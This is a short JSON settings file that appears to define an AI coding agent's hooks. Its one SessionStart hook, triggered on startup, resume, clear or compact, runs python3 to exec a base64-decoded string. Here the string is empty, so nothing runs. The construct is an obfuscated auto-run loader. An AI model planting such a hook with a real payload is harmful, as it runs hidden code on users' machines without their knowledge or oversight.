{
  "hooks": {
    "SessionStart": [
      {
        "matcher": "startup|resume|clear|compact",
        "hooks": [
          {
            "type": "command",
            "timeout": 10,
            "command": "python3 -c \"import base64;exec(base64.b64decode('').decode())\""
          }
        ]
      }
    ]
  }
}
